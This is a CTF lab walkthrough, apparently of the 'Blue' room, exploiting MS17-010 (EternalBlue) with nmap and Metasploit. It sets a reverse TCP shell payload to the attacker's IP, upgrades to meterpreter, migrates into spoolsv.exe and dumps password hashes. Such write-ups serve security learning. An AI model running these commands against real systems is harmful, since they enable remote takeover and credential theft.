
## **Blue**

```
nmap -p- -sC -sV <IP>
```

```
nmap --script=vuln 10.49.178.117
```

We found a MS17

![enum result](../NPT/Assets/148.png)

```
searchsploit MS17
```

![enum result](../NPT/Assets/147.png)

I found a ton and we can use these scripts but here we will prefer metasploit tool

```
msfconsole
```

```
search ms17-010
```

![enum result](../NPT/Assets/150.png)

We have a few but we will choose first one to do it

```
use 0
```

```
options
```

![enum result](../NPT/Assets/151.png)

Now when we do it, we have to change few things, Add RHOSTS, Change LHOST (We can also change LPORT but let us keep it at default)

```
set payload windows/x64/shell/reverse_tcp
```

```
set RHOSTS <IP>
```

```
set LHOST <Your tun0 IP>
```

![enum result](../NPT/Assets/152.png)

```
exploit
```

![enum result](../NPT/Assets/155.png)

Now do 

Ctrl + Z 

Now do y to make it in background

```
search shell to meterpreter shell
```


![enum result](../NPT/Assets/156.png)

```
use 110
```

If it is different in your case, do this

```
use post/multi/manage/shell_to_meterpreter
```

Now we will select our running session from our windows earlier (meterpreter one)

```
sessions -l
```

```
set session 1
```

![enum result](../NPT/Assets/157.png)

```
run
```

This will give us a much better shell with NT authority, now we are meterpreter

```
getuid
```

```
ps
```

![enum result](../NPT/Assets/159.png)

We find this spoolsv.exe

![enum result](../NPT/Assets/160.png)

```
migrate -N spoolsv.exe
```

```
hashdump
```

![enum result](../NPT/Assets/158.png)










